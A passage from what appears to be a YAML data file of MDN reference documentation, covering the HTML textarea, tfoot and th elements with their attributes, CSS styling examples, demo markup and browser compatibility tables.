\n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/template](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/template)"
- name: textarea
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<textarea\\>: The Textarea element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Ftextarea&level=high)\n\nThe `<textarea>` [HTML](../index) element represents a multi-line plain-text editing control, useful when you want to allow users to enter a sizeable amount of free-form text, for example a comment on a review or feedback form.\n\n## Try it\n\n#### HTML Demo: \\<textarea\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <label for=\"story\">Tell us your story:</label>\n\n    <textarea id=\"story\" name=\"story\" rows=\"5\" cols=\"33\">\n    It was a dark and stormy night...\n    </textarea>\n\n    label,\n    textarea {\n      font-size: 0.8rem;\n      letter-spacing: 1px;\n    }\n\n    textarea {\n      padding: 10px;\n      max-width: 100%;\n      line-height: 1.5;\n      border-radius: 5px;\n      border: 1px solid #ccc;\n      box-shadow: 1px 1px 1px #999;\n    }\n\n    label {\n      display: block;\n      margin-bottom: 10px;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nThe above example demonstrates a number of features of `<textarea>`:\n\n- An `id` attribute to allow the `<textarea>` to be associated with a [`<label>`](label) element for accessibility purposes\n- A `name` attribute to set the name of the associated data point submitted to the server when the form is submitted.\n- `rows` and `cols` attributes to allow you to specify an exact size for the `<textarea>` to take. Setting these is a good idea for consistency, as browser defaults can differ.\n- Default content entered between the opening and closing tags. `<textarea>` does not support the `value` attribute.\n\nThe `<textarea>` element also accepts several attributes common to form `<input>`s, such as `autocapitalize`, `autocomplete`, `autofocus`, `disabled`, `placeholder`, `readonly`, and `required`.\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`autocapitalize`](#autocapitalize)  \nControls whether inputted text is automatically capitalized and, if so, in what manner. See the [`autocapitalize`](../global_attributes/autocapitalize) global attribute page for more information.\n\n[`autocomplete`](../attributes/autocomplete)  \nThis attribute indicates whether the value of the control can be automatically completed by the browser. Possible values are:\n\n- `off`: The user must explicitly enter a value into this field for every use, or the document provides its own auto-completion method; the browser does not automatically complete the entry.\n- `on`: The browser can automatically complete the value based on values that the user has entered during previous uses.\n\nIf the `autocomplete` attribute is not specified on a `<textarea>` element, then the browser uses the `autocomplete` attribute value of the `<textarea>` element's form owner. The form owner is either the [`<form>`](form) element that this `<textarea>` element is a descendant of or the form element whose `id` is specified by the `form` attribute of the input element. For more information, see the [`autocomplete`](form#autocomplete) attribute in [`<form>`](form).\n\n[`autocorrect`](#autocorrect) Non-standard  \nA string which indicates whether to activate automatic spelling correction and processing of text substitutions (if any are configured) while the user is editing this `textarea`. Permitted values are:\n\n[`on`](#on)  \nEnable automatic spelling correction and text substitutions.\n\n[`off`](#off)  \nDisable automatic spelling correction and text substitutions.\n\n[`autofocus`](#autofocus)  \nThis Boolean attribute lets you specify that a form control should have input focus when the page loads. Only one form-associated element in a document can have this attribute specified.\n\n[`cols`](#cols)  \nThe visible width of the text control, in average character widths. If it is specified, it must be a positive integer. If it is not specified, the default value is `20`.\n\n[`dirname`](../attributes/dirname)  \nThis attribute is used to indicate the text directionality of the element contents. For more information, see the [`dirname` attribute](../attributes/dirname).\n\n[`disabled`](../attributes/disabled)  \nThis Boolean attribute indicates that the user cannot interact with the control. If this attribute is not specified, the control inherits its setting from the containing element, for example [`<fieldset>`](fieldset); if there is no containing element when the `disabled` attribute is set, the control is enabled.\n\n[`form`](#form)  \nThe form element that the `<textarea>` element is associated with (its \"form owner\"). The value of the attribute must be the `id` of a form element in the same document. If this attribute is not specified, the `<textarea>` element must be a descendant of a form element. This attribute enables you to place `<textarea>` elements anywhere within a document, not just as descendants of form elements.\n\n[`maxlength`](../attributes/maxlength)  \nThe maximum string length (measured in UTF-16 code units) that the user can enter. If this value isn't specified, the user can enter an unlimited number of characters.\n\n[`minlength`](../attributes/minlength)  \nThe minimum string length (measured in UTF-16 code units) required that the user should enter.\n\n[`name`](#name)  \nThe name of the control.\n\n[`placeholder`](../attributes/placeholder)  \nA hint to the user of what can be entered in the control. Carriage returns or line-feeds within the placeholder text must be treated as line breaks when rendering the hint.\n\n**Note:** Placeholders should only be used to show an example of the type of data that should be entered into a form; they are *not* a substitute for a proper [`<label>`](label) element tied to the input. See [`<input>` labels](input#labels) for a full explanation.\n\n[`readonly`](../attributes/readonly)  \nThis Boolean attribute indicates that the user cannot modify the value of the control. Unlike the `disabled` attribute, the `readonly` attribute does not prevent the user from clicking or selecting in the control. The value of a read-only control is still submitted with the form.\n\n[`required`](../attributes/required)  \nThis attribute specifies that the user must fill in a value before submitting a form.\n\n[`rows`](#rows)  \nThe number of visible text lines for the control. If it is specified, it must be a positive integer. If it is not specified, the default value is 2.\n\n[`spellcheck`](../global_attributes#spellcheck)  \nSpecifies whether the `<textarea>` is subject to spell-checking by the underlying browser/OS. The value can be:\n\n- `true`: Indicates that the element needs to have its spelling and grammar checked.\n- `default` : Indicates that the element is to act according to a default behavior, possibly based on the parent element's own `spellcheck` value.\n- `false` : Indicates that the element should not be spell-checked.\n\n[`wrap`](#wrap)  \nIndicates how the control should wrap the value for form submission. Possible values are:\n\n- `hard`: The browser automatically inserts line breaks (CR+LF) so that each line is no longer than the width of the control; the [`cols`](#cols) attribute must be specified for this to take effect\n- `soft`: The browser ensures that all line breaks in the entered value are a `CR+LF` pair, but no additional line breaks are added to the value.\n- `off` Non-standard : Like `soft` but changes appearance to `white-space: pre` so line segments exceeding `cols` are not wrapped and the `<textarea>` becomes horizontally scrollable.\n\nIf this attribute is not specified, `soft` is its default value.\n\n## Styling with CSS\n\n`<textarea>` is a [replaced element](https://developer.mozilla.org/en-US/docs/Web/CSS/Replaced_element) — it has intrinsic dimensions, like a raster image. By default, its [`display`](https://developer.mozilla.org/en-US/docs/Web/CSS/display) value is `inline-block`. Compared to other form elements it is relatively easy to style, with its box model, fonts, color scheme, etc. being easily manipulable using regular CSS.\n\n[Styling HTML forms](https://developer.mozilla.org/en-US/docs/Learn/Forms/Styling_web_forms) provides some useful tips on styling `<textarea>`s.\n\n### Baseline inconsistency\n\nThe HTML specification doesn't define where the baseline of a `<textarea>` is, so different browsers set it to different positions. For Gecko, the `<textarea>` baseline is set on the baseline of the first line of the textarea, on another browser it may be set on the bottom of the `<textarea>` box. Don't use [`vertical-align: baseline`](https://developer.mozilla.org/en-US/docs/Web/CSS/vertical-align) on it; the behavior is unpredictable.\n\n### Controlling whether a textarea is resizable\n\nIn most browsers, `<textarea>`s are resizable — you'll notice the drag handle in the right-hand corner, which can be used to alter the size of the element on the page. This is controlled by the [`resize`](https://developer.mozilla.org/en-US/docs/Web/CSS/resize) CSS property — resizing is enabled by default, but you can explicitly disable it using a `resize` value of `none`:\n\ncss\n\n```\ntextarea {\n  resize: none;\n}\n```\n\n### Styling valid and invalid values\n\nValid and invalid values of a `<textarea>` element (e.g. those within, and outside the bounds set by `minlength`, `maxlength`, or `required`) can be highlighted using the [`:valid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:valid) and [`:invalid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:invalid) pseudo-classes. For example, to give your textarea a different border depending on whether it is valid or invalid:\n\ncss\n\n```\ntextarea:invalid {\n  border: 2px dashed red;\n}\n\ntextarea:valid {\n  border: 2px solid lime;\n}\n```\n\n## Examples\n\n### Basic example\n\nThe following example shows a textarea with a set number of rows and columns, some default content, and CSS styles that prevent users from resizing the element more than 500px wide and 130px high:\n\nhtml\n\n```\n<textarea name=\"textarea\" rows=\"5\" cols=\"15\">Write something here</textarea>\n```\n\ncss\n\n```\ntextarea {\n  max-height: 130px;\n  max-width: 500px;\n}\n```\n\n#### Result\n\n### Example using \"minlength\" and \"maxlength\"\n\nThis example has a minimum and maximum number of characters — of 10 and 20 respectively. Try it and see.\n\nhtml\n\n```\n<textarea name=\"textarea\" rows=\"5\" cols=\"30\" minlength=\"10\" maxlength=\"20\">\nWrite something here…\n</textarea>\n```\n\ncss\n\n```\ntextarea {\n  max-height: 130px;\n  max-width: 500px;\n}\n```\n\n#### Result\n\nNote that `minlength` doesn't stop the user from removing characters so that the number entered goes past the minimum, but it does make the value entered into the `<textarea>` invalid. Also note that even if you have a `minlength` value set (3, for example), an empty `<textarea>` is still considered valid unless you also have the `required` attribute set.\n\n### Example using \"placeholder\"\n\nThis example has a placeholder set. Notice how it disappears when you start typing into the box.\n\nhtml\n\n```\n<textarea\n  name=\"textarea\"\n  rows=\"5\"\n  cols=\"30\"\n  placeholder=\"Comment text.\"></textarea>\n```\n\ncss\n\n```\ntextarea {\n  max-height: 130px;\n  max-width: 500px;\n}\n```\n\n#### Result\n\n**Note:** Placeholders should only be used to show an example of the type of data that should be entered into a form; they are *not* a substitute for a proper [`<label>`](label) element tied to the input. See [`<input>` labels](input#labels) for a full explanation.\n\n### Disabled and readonly textareas\n\nThis example shows two `<textarea>`s — one is [`readonly`](../attributes/readonly) and one is [`disabled`](../attributes/disabled). You cannot edit the contents of either element, but the `readonly` element is focusable and its value is submitted in forms. The `disabled` element's value is not submitted and it's not focusable.\n\nhtml\n\n```\n<textarea name=\"textarea\" rows=\"5\" cols=\"30\" readonly>\nI am a read-only textarea.\n</textarea>\n<textarea name=\"textarea\" rows=\"5\" cols=\"30\" disabled>\nI am a disabled textarea.\n</textarea>\n```\n\ncss\n\n```\ntextarea {\n  display: block;\n  resize: horizontal;\n  max-width: 500px;\n}\n```\n\n#### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |\n|---------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), [Interactive content](../content_categories#interactive_content), [listed](../content_categories#form_listed), [labelable](../content_categories#form_labelable), [resettable](../content_categories#form_resettable), and [submittable](../content_categories#form_submittable) [form-associated](../content_categories#form-associated_) element. |\n| Permitted content                           | Text                                                                                                                                                                                                                                                                                                                                                                                                                                                                |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                                                                                                                                                                                                                                                                                                                               |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                                                                                                                                                                                                                                                                                                                                                                |\n| Implicit ARIA role                          | [`textbox`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/textbox_role)                                                                                                                                                                                                                                                                                                                                                                     |\n| Permitted ARIA roles                        | No `role` permitted                                                                                                                                                                                                                                                                                                                                                                                                                                                 |\n| DOM interface                               | [`HTMLTextAreaElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLTextAreaElement)                                                                                                                                                                                                                                                                                                                                                                       |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- Other form-related elements:\n  - [`<form>`](form)\n  - [`<button>`](button)\n  - [`<datalist>`](datalist)\n  - [`<legend>`](legend)\n  - [`<label>`](label)\n  - [`<select>`](select)\n  - [`<optgroup>`](optgroup)\n  - [`<option>`](option)\n  - [`<input>`](input)\n  - [`<fieldset>`](fieldset)\n  - [`<output>`](output)\n  - [`<progress>`](progress)\n  - [`<meter>`](meter)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/textarea](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/textarea)"
- name: tfoot
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<tfoot\\>: The Table Foot element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Ftfoot&level=high)\n\nThe `<tfoot>` [HTML](../index) element encapsulates a set of table rows ([`<tr>`](tr) elements), indicating that they comprise the foot of a table with information about the table's columns. This is usually a summary of the columns, e.g., a sum of the given numbers in a column.\n\n## Try it\n\n#### HTML Demo: \\<tfoot\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <table>\n      <caption>\n        Council budget (in £) 2018\n      </caption>\n      <thead>\n        <tr>\n          <th scope=\"col\">Items</th>\n          <th scope=\"col\">Expenditure</th>\n        </tr>\n      </thead>\n      <tbody>\n        <tr>\n          <th scope=\"row\">Donuts</th>\n          <td>3,000</td>\n        </tr>\n        <tr>\n          <th scope=\"row\">Stationery</th>\n          <td>18,000</td>\n        </tr>\n      </tbody>\n      <tfoot>\n        <tr>\n          <th scope=\"row\">Totals</th>\n          <td>21,000</td>\n        </tr>\n      </tfoot>\n    </table>\n\n    thead,\n    tfoot {\n      background-color: #2c5e77;\n      color: #fff;\n    }\n\n    tbody {\n      background-color: #e4f0f5;\n    }\n\n    table {\n      border-collapse: collapse;\n      border: 2px solid rgb(140 140 140);\n      font-family: sans-serif;\n      font-size: 0.8rem;\n      letter-spacing: 1px;\n    }\n\n    caption {\n      caption-side: bottom;\n      padding: 10px;\n    }\n\n    th,\n    td {\n      border: 1px solid rgb(160 160 160);\n      padding: 8px 10px;\n    }\n\n    td {\n      text-align: center;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n### Deprecated attributes\n\nThe following attributes are deprecated and should not be used. They are documented below for reference when updating existing code and for historical interest only.\n\n[`align`](#align) Deprecated  \nSpecifies the horizontal alignment of each foot cell. The possible [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) values are `left`, `center`, `right`, `justify`, and `char`. When supported, the `char` value aligns the textual content on the character defined in the [`char`](#char) attribute and on offset defined by the [`charoff`](#charoff) attribute. Use the [`text-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-align) CSS property instead, as this attribute is deprecated.\n\n[`bgcolor`](#bgcolor) Deprecated  \nDefines the background color of each foot cell. The value is an HTML color; either a [6-digit hexadecimal RGB code](https://developer.mozilla.org/en-US/docs/Web/CSS/hex-color), prefixed by a '`#`', or a [color keyword](https://developer.mozilla.org/en-US/docs/Web/CSS/named-color). Other CSS [`<color>`](https://developer.mozilla.org/en-US/docs/Web/CSS/color_value) values are not supported. Use the [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color) CSS property instead, as this attribute is deprecated.\n\n[`char`](#char) Deprecated  \nDoes nothing. It was originally intended to specify the alignment of the content to a character of each foot cell. Typical values for this include a period (`.`) when attempting to align numbers or monetary values. If [`align`](#align) is not set to `char`, this attribute is ignored.\n\n[`charoff`](#charoff) Deprecated  \nDoes nothing. It was originally intended to specify the number of characters to offset the foot cell content from the alignment character specified by the [`char`](#char) attribute.\n\n[`valign`](#valign) Deprecated  \nSpecifies the vertical alignment of each foot cell. The possible [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) values are `baseline`, `bottom`, `middle`, and `top`. Use the [`vertical-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/vertical-align) CSS property instead, as this attribute is deprecated.\n\n## Usage notes\n\n- The `<tfoot>` is placed after any [`<caption>`](caption), [`<colgroup>`](colgroup), [`<thead>`](thead), [`<tbody>`](tbody), and [`<tr>`](tr) elements.\n- Along with its related [`<thead>`](thead) and [`<tbody>`](tbody) elements, the `<tfoot>` element provides useful [semantic](https://developer.mozilla.org/en-US/docs/Glossary/Semantics) information and can be used when rendering for either screen or print. Specifying such table content groups also provides valuable contextual information for assistive technologies, including screen readers and search engines.\n- When printing a document, in the case of a multipage table, the table foot usually specifies information that is output as an intermediate summary on each page.\n\n## Example\n\nSee [`<table>`](table) for a complete table example introducing common standards and best practices.\n\n### Table with footer\n\nThis example demonstrates a table divided into a head section with column headers, a body section with the table's main data, and a foot section summarizing data of one column.\n\n#### HTML\n\nThe [`<thead>`](thead), [`<tbody>`](tbody), and `<tfoot>` elements are used to structure a basic table into [semantic](https://developer.mozilla.org/en-US/docs/Glossary/Semantics) sections. The `<tfoot>` element represents the foot section of the table, which contains a row ([`<tr>`](tr)) representing the calculated average of the values in the \"Credits\" column.\n\nTo allocate the cells in the foot to the correct columns, the [`colspan`](th#colspan) attribute is used on the [`<th>`](th) element to span row header cell across the first three table columns. The single data cell ([`<td>`](td)) in the foot is automatically placed in the correct location, i.e., the fourth column, with the omitted [`colspan`](td#colspan) attribute value defaulting to `1`. Additionally, the [`scope`](th#scope) attribute is set to `row` on the header cell ([`<th>`](th)) in the foot to explicitly define that this foot header cell relates to the table cells within the same row, which in our example is the one data cell in the foot row that contains the calculated average.\n\nhtml\n\n```\n<table>\n  <thead>\n    <tr>\n      <th>Student ID</th>\n      <th>Name</th>\n      <th>Major</th>\n      <th>Credits</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td>3741255</td>\n      <td>Jones, Martha</td>\n      <td>Computer Science</td>\n      <td>240</td>\n    </tr>\n    <tr>\n      <td>3971244</td>\n      <td>Nim, Victor</td>\n      <td>Russian Literature</td>\n      <td>220</td>\n    </tr>\n    <tr>\n      <td>4100332</td>\n      <td>Petrov, Alexandra</td>\n      <td>Astrophysics</td>\n      <td>260</td>\n    </tr>\n  </tbody>\n  <tfoot>\n    <tr>\n      <th colspan=\"3\" scope=\"row\">Average Credits</th>\n      <td>240</td>\n    </tr>\n  </tfoot>\n</table>\n```\n\n#### CSS\n\nSome basic CSS is used to style and highlight the table foot so that the foot cells stand out from the data in the table body.\n\ncss\n\n```\ntfoot {\n  border-top: 3px dotted rgb(160 160 160);\n  background-color: #2c5e77;\n  color: #fff;\n}\n\ntfoot th {\n  text-align: right;\n}\n\ntfoot td {\n  font-weight: bold;\n}\n\nthead {\n  border-bottom: 2px solid rgb(160 160 160);\n  background-color: #2c5e77;\n  color: #fff;\n}\n\ntbody {\n  background-color: #e4f0f5;\n}\n```\n\n#### Result\n\n## Technical summary\n\n[TABLE]\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|           | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|           | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `tfoot`   | 1       | 12   | 1       | ≤12.1 | 1      | 18             | 4                   | ≤12.1         | 1             | 1.0              | 4.4             |     |\n| `align`   | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `bgcolor` | 1       | 12   | 1       | ≤15   | 1      | 18             | 4                   | ≤14           | 1             | 1.0              | 4.4             |     |\n| `char`    | 1       | 12   | No      | 15    | ≤4     | 18             | No                  | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `charoff` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `valign`  | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n\n## See also\n\n- [Learn: HTML tables](https://developer.mozilla.org/en-US/docs/Learn/HTML/Tables)\n- [`<caption>`](caption), [`<col>`](col), [`<colgroup>`](colgroup), [`<table>`](table), [`<tbody>`](tbody), [`<td>`](td), [`<th>`](th), [`<thead>`](thead), [`<tr>`](tr): Other table-related elements\n- [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color): CSS property to set the background color of each foot cell\n- [`border`](https://developer.mozilla.org/en-US/docs/Web/CSS/border): CSS property to control borders of foot cells\n- [`text-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-align): CSS property to horizontally align each foot cell content\n- [`vertical-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/vertical-align): CSS property to vertically align each foot cell content\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/tfoot](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/tfoot)"
- name: th
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<th\\>: The Table Header element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fth&level=high)\n\nThe `<th>` [HTML](../index) element defines a cell as the header of a group of table cells and may be used as a child of the [`<tr>`](tr) element. The exact nature of this group is defined by the [`scope`](#scope) and [`headers`](#headers) attributes.\n\n## Try it\n\n#### HTML Demo: \\<th\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <table>\n      <caption>\n        Alien football stars\n      </caption>\n      <tr>\n        <th scope=\"col\">Player</th>\n        <th scope=\"col\">Gloobles</th>\n        <th scope=\"col\">Za'taak</th>\n      </tr>\n      <tr>\n        <th scope=\"row\">TR-7</th>\n        <td>7</td>\n        <td>4,569</td>\n      </tr>\n      <tr>\n        <th scope=\"row\">Khiresh Odo</th>\n        <td>7</td>\n        <td>7,223</td>\n      </tr>\n      <tr>\n        <th scope=\"row\">Mia Oolong</th>\n        <td>9</td>\n        <td>6,219</td>\n      </tr>\n    </table>\n\n    th,\n    td {\n      border: 1px solid rgb(160 160 160);\n      padding: 8px 10px;\n    }\n\n    th[scope='col'] {\n      background-color: #505050;\n      color: #fff;\n    }\n\n    th[scope='row'] {\n      background-color: #d6ecd4;\n    }\n\n    td {\n      text-align: center;\n    }\n\n    tr:nth-of-type(even) {\n      background-color: #eee;\n    }\n\n    table {\n      border-collapse: collapse;\n      border: 2px solid rgb(140 140 140);\n      font-family: sans-serif;\n      font-size: 0.8rem;\n      letter-spacing: 1px;\n    }\n\n    caption {\n      caption-side: bottom;\n      padding: 10px;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`abbr`](#abbr)  \nA short, abbreviated description of the header cell's content provided as an alternative label to use for the header cell when referencing the cell in other contexts. Some user-agents, such as speech readers, may present this description before the content itself.\n\n[`colspan`](#colspan)  \nA non-negative integer value indicating how many columns the header cell spans or extends. The default value is `1`. User agents dismiss values higher than 1000 as incorrect, defaulting such values to `1`.\n\n[`headers`](#headers)  \nA list of space-separated strings corresponding to the `id` attributes of the `<th>` elements that provide the headers for this header cell.\n\n[`rowspan`](#rowspan)  \nA non-negative integer value indicating how many rows the header cell spans or extends. The default value is `1`; if its value is set to `0`, the header cell will extends to the end of the table grouping section ([`<thead>`](thead), [`<tbody>`](tbody), [`<tfoot>`](tfoot), even if implicitly defined), that the `<th>` belongs to. Values higher than `65534` are clipped at `65534`.\n\n[`scope`](#scope)  \nDefines the cells that the header (defined in the `<th>`) element relates to. Possible [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) values are:\n\n- `row`: the header relates to all cells of the row it belongs to;\n- `col`: the header relates to all cells of the column it belongs to;\n- `rowgroup`: the header belongs to a rowgroup and relates to all of its cells;\n- `colgroup`: the header belongs to a colgroup and relates to all of its cells.\n\nIf the `scope` attribute is not specified, or its value is not `row`, `col`, `rowgroup`, or `colgroup`, then browsers automatically select the set of cells to which the header cell applies.\n\n### Deprecated attributes\n\nThe following attributes are deprecated and should not be used. They are documented below for reference when updating existing code and for historical interest only.\n\n[`align`](#align) Deprecated  \nSpecifies the horizontal alignment of the header cell. The possible [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) values are `left`, `center`, `right`, `justify`, and `char`. When supported, the `char` value aligns the textual content on the character defined in the [`char`](#char) attribute and the offset defined by the [`charoff`](#charoff) attribute. Use the [`text-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-align) CSS property instead, as this attribute is deprecated.\n\n[`axis`](#axis) Deprecated  \nContains a list of space-separated strings, each corresponding to the `id` attribute of a group of cells that the header cell applies to. Use the [`scope`](#scope) attribute instead, as this attribute is deprecated.\n\n[`bgcolor`](#bgcolor) Deprecated  \nDefines the background color of the header cell. The value is an HTML color; either a [6-digit hexadecimal RGB code](https://developer.mozilla.org/en-US/docs/Web/CSS/hex-color), prefixed by a '`#`', or a [color keyword](https://developer.mozilla.org/en-US/docs/Web/CSS/named-color). Other CSS [`<color>`](https://developer.mozilla.org/en-US/docs/Web/CSS/color_value) values are not supported. Use the [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color) CSS property instead, as this attribute is deprecated.\n\n[`char`](#char) Deprecated  \nDoes nothing. It was originally intended to specify the alignment of the content to a character of the header cell. Typical values for this include a period (`.`) when attempting to align numbers or monetary values. If [`align`](#align) is not set to `char`, this attribute is ignored.\n\n[`charoff`](#charoff) Deprecated  \nDoes nothing. It was originally intended to specify the number of characters to offset the header cell content from the alignment character specified by the [`char`](#char) attribute.\n\n[`height`](#height) Deprecated  \nDefines a recommended header cell height. Use the [`height`](https://developer.mozilla.org/en-US/docs/Web/CSS/height) CSS property instead, as this attribute is deprecated.\n\n[`valign`](#valign) Deprecated  \nSpecifies the vertical alignment of the header cell. The possible [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) values are `baseline`, `bottom`, `middle`, and `top`. Use the [`vertical-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/vertical-align) CSS property instead, as this attribute is deprecated.\n\n[`width`](#width) Deprecated  \nDefines a recommended header cell width. Use the [`width`](https://developer.mozilla.org/en-US/docs/Web/CSS/width) CSS property instead, as this attribute is deprecated.\n\n## Usage notes\n\n- The `<th>` may only be used within a [`<tr>`](tr) element.\n- In simple contexts, using the [`scope`](#scope) attribute on header cells (`<th>` elements) is redundant because [`scope`](#scope) is inferred. However, certain assistive technologies may fail to infer correctly, so specifying header scope may improve user experiences.\n- When using the [`colspan`](#colspan) and [`rowspan`](#rowspan) attributes to span header cells across multiple columns and rows, cells without these attributes defined (with a default value of `1`) are automatically fitted into free available spaces in the table structure that span 1x1 cells, as illustrated in the following figure:\n  **Note:** These attributes must not be used to overlap cells.\n\n## Examples\n\nSee [`<table>`](table) for a complete table example introducing common standards and best practices.\n\n### Basic column and row headers\n\nThis example uses `<th>` elements to introduce column and row headers in a basic table structure.\n\n#### HTML\n\nThe first row ([`<tr>`](tr) element) contains the column headers (`<th>` elements), which act as \"titles\" for the columns to make it easier to understand the information in the columns and identify the data. To indicate that each column header relates to all cells in the corresponding column, the [`scope`](#scope) attribute is set to `col` (column).\n\nThe remaining rows contain the main data of the table. Each of these rows has a row header (`<th>` element) introduced as the first cell. This creates a column with row headers as the first column of the table. Similar to the column headers, the [`scope`](#scope) attribute is set to `row` to specify which cells each row header relates to, which in the example below are all data cells ([`<td>`](td) elements) in each `row`.\n\n**Note:** Normally, the grouping elements [`<thead>`](thead) and [`<tbody>`](tbody) are used to group rows with headers into the respective table head and body sections. These elements are omitted in this example to reduce complexity and enable focusing on the use of header cells.\n\nhtml\n\n```\n<table>\n  <tr>\n    <th scope=\"col\">Symbol</th>\n    <th scope=\"col\">Code word</th>\n    <th scope=\"col\">Pronunciation</th>\n  </tr>\n  <tr>\n    <th scope=\"row\">A</th>\n    <td>Alfa</td>\n    <td>AL fah</td>\n  </tr>\n  <tr>\n    <th scope=\"row\">B</th>\n    <td>Bravo</td>\n    <td>BRAH voh</td>\n  </tr>\n  <tr>\n    <th scope=\"row\">C</th>\n    <td>Charlie</td>\n    <td>CHAR lee</td>\n  </tr>\n  <tr>\n    <th scope=\"row\">D</th>\n    <td>Delta</td>\n    <td>DELL tah</td>\n  </tr>\n</table>\n```\n\n#### CSS\n\nSome basic CSS is used to style the table and its cells. We use CSS [attribute selectors](https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors) to target header cells based on their [`scope`](#scope) attribute values, highlighting column and row headers (`<th>` elements) and differentiating them each other and from the data cells ([`<td>`](td)).\n\ncss\n\n```\nth,\ntd {\n  border: 1px solid rgb(160 160 160);\n  padding: 8px 10px;\n}\n\nth[scope=\"col\"] {\n  background-color: #505050;\n  color: #fff;\n}\n\nth[scope=\"row\"] {\n  background-color: #d6ecd4;\n}\n\ntr:nth-of-type(odd) td {\n  background-color: #eee;\n}\n```\n\n#### Result\n\n### Column and row spanning\n\nThis example extends and enhances the basic table from the [previous example](#basic_column_and_row_headers) by adding a second row for additional column headers.\n\n#### HTML\n\nAn additional table row ([`<tr>`](tr) element) is added as the second header row of the table with two additional column headers (`<th>` elements). In this way, the \"Pronunciation\" column is split into two columns, one for the IPA (International Phonetic Alphabet) notation and one for the respelling (the original pronunciation column). The corresponding data cells 